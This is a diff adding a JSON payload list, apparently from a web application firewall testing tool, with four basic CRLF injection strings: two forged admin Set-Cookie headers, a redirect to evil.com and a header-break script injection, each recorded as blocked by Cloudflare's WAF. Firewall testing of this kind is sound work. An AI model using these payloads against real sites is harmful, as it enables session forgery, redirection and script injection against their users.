@@ -1,0 +1,63 @@
+{
+  "category": "crlf_injection",
+  "subcategory": "basic",
+  "count": 4,
+  "payloads": [
+    {
+      "id": "crlf_injection-1001",
+      "category": "crlf_injection",
+      "subcategory": "basic",
+      "payload": "%0d%0aSet-Cookie: admin=true",
+      "description": "CRLF cookie injection",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-1002",
+      "category": "crlf_injection",
+      "subcategory": "basic",
+      "payload": "%0d%0aLocation: http://evil.com",
+      "description": "CRLF redirect",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-1003",
+      "category": "crlf_injection",
+      "subcategory": "basic",
+      "payload": "%0d%0a%0d%0a<script>alert(1)</script>",
+      "description": "CRLF XSS",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "crlf_injection-1004",
+      "category": "crlf_injection",
+      "subcategory": "basic",
+      "payload": "%0aSet-Cookie: admin=true",
+      "description": "LF cookie injection",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
